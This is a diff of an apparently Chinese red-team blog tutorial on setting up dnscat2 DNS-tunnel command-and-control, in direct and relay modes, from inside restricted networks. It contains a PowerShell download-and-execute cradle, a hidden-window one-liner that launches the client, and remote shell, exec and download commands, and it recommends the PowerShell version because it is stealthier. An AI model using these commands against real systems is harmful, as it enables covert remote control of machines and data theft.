@@ -437,7 +437,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.3k
                 </div>
                 
 
@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -471,43 +474,53 @@
 <p>中继模式：像平时上网一样，DNS 先经过互联网的解析，最终指向我们的恶意 DNS 服务器，与直连模式相比速度较慢但是更安全。</p>
 <p>在安全策略做的比较严格的内网中，如果发现只允许白名单流量出站，而且内网中还有诸多安全设备，同时在传统的 C2 通信无法建立的情况下，RT 就可以尝试使用 DNS 协议建立 C2 通信。</p>
 <h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><h2 id="1、服务端"><a href="#1、服务端" class="headerlink" title="1、服务端"></a>1、服务端</h2><p>这里以 Ubuntu 为例</p>
-<pre><code>git clone https://github.com/iagox86/dnscat2.git
-cd dnscat2/server/
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git
+cd dnscat2&#x2F;server&#x2F;
 sudo gem install bundler
-bundle install</code></pre>
+bundle install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>如果运行 <code>sudo gem install bundler</code> 提示 <code>Command &#39;gem&#39; not found</code>，则需要先安装 ruby </p>
-<pre><code>sudo apt-get install ruby</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install ruby<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果运行 <code>bundle install</code> 提示 <code>Gem::Ext::BuildError: ERROR: Failed to build gem native extension.</code>，则需要先安装 ruby-dev</p>
-<pre><code>sudo apt-get install ruby-dev</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo apt-get install ruby-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h2 id="2、客户端"><a href="#2、客户端" class="headerlink" title="2、客户端"></a>2、客户端</h2><p>dnscat2 客户端在使用前需要进行编译才能使用，在 Windows 中可以使用 VS 进行编译或者直接使用 PowerShell 的版本，Linux 中可以使用 <code>make install</code> 进行编译。</p>
 <p>Linux 下可以通过以下方法进行编译</p>
-<pre><code>git clone https://github.com/iagox86/dnscat2.git
-cd dnscat2/client/
-make</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git
+cd dnscat2&#x2F;client&#x2F;
+make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>Windows 可以直接下载已经编译好的版本</p>
 <p>exe 版（解压密码：password）：<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p>
 <p>PowerShell 版：<a target="_blank" rel="noopener" href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p>
 <p>如果使用 PowerShell 版，可以直接使用下面的命令导入，在实际情况中，也更推荐使用 PowerShell 版的，毕竟隐蔽性要更好些。</p>
-<pre><code>IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;)</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>或者下载 ps1 文件后，使用以下命令导入</p>
-<pre><code>Import-Module .\dnscat2.ps1</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">Import-Module .\dnscat2.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><h2 id="1、直连模式"><a href="#1、直连模式" class="headerlink" title="1、直连模式"></a>1、直连模式</h2><p><strong>启动服务端</strong>，这里服务端 IP 为 172.16.214.50</p>
-<pre><code>cd /dnscat2/server
-sudo ruby ./dnscat2.rb -s 553 -c teamssix --no-cache</code></pre>
-<pre><code>-s 指定 dns 服务端口
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;dnscat2&#x2F;server
+sudo ruby .&#x2F;dnscat2.rb -s 553 -c teamssix --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">-s 指定 dns 服务端口
 -c 指定连接密码
---no-cache 禁止缓存，添加该项为了使和 PowerShell 版本的 dnscat2 兼容</code></pre>
+--no-cache 禁止缓存，添加该项为了使和 PowerShell 版本的 dnscat2 兼容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>启动客户端</strong>，这里以 Windows 下的 exe 版为例</p>
-<pre><code>dnscat --dns server=172.16.214.50,port=553 --secret=teamssix</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">dnscat --dns server&#x3D;172.16.214.50,port&#x3D;553 --secret&#x3D;teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>连接成功后，会提示 <code>Session established!</code></p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_16-44-12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>dnscat2 的一些命令</p>
-<pre><code>sessions 或 windows                         查看当前会话
-session -i 1 或 window -i 1         进入 ID 为 1 的会话
-shell                     建立交互式会话
-exec                        远程打开程序
-download              下载文件
-help                        查看支持的命令</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sessions 或 windows 						查看当前会话
+session -i 1 或 window -i 1 		进入 ID 为 1 的会话
+shell 					建立交互式会话
+exec						远程打开程序
+download			  下载文件
+help						查看支持的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/WX20210607-165615@2x.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>抓下包，看看流量是什么样子的</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-01-52.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
@@ -517,19 +530,26 @@ help                        查看支持的命令</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果想要判断自己的解析记录是否设置成功，可以通过以下方法进行判断。</p>
 <p>A 记录：直接通过 nslookup 进行判断，如果解析出了 IP 说明该项配置正确。</p>
-<pre><code>nslookup ns1.teamssix.com</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">nslookup ns1.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>ns 记录：在公网 VPS 上开启抓包，再<code>nslookup dc.teamssix.com</code>，如果在 VPS 上看到对应的流量记录，说明该项配置正确。</p>
-<pre><code>sudo tcpdump -n -i eth0 udp dst port 53</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo tcpdump -n -i eth0 udp dst port 53<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_13-46-54.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p><strong>开启服务端</strong></p>
-<pre><code>sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open</code></pre>
-<pre><code>-e 指定安全级别，open 表示服务端允许客户端不进行加密</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo ruby dnscat2.rb dc.teamssix.com -c teamssix --no-cache -e open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">-e 指定安全级别，open 表示服务端允许客户端不进行加密<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果提示<code>Address already in use - bind(2) for &quot;0.0.0.0&quot; port 53</code>，可以关闭<code>systemd-resolved</code></p>
-<pre><code>sudo systemctl stop systemd-resolved</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">sudo systemctl stop systemd-resolved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><strong>开启客户端</strong>，这里以 Windows 下的 PowerShell 版为例</p>
-<pre><code>start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>也可以把导入的命令和开启客户端的命令放在一起</p>
-<pre><code>powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c &#123;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;lukebaggett&#x2F;dnscat2-powershell&#x2F;master&#x2F;dnscat2.ps1&#39;);start-Dnscat2 -Domain dc.teamssix.com -PreSharedSecret teamssix -DNSServer vps_ip&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-35-33.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>再来抓下包，看看流量是什么样的</p>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_14-45-40.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
@@ -968,7 +988,7 @@ help                        查看支持的命令</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
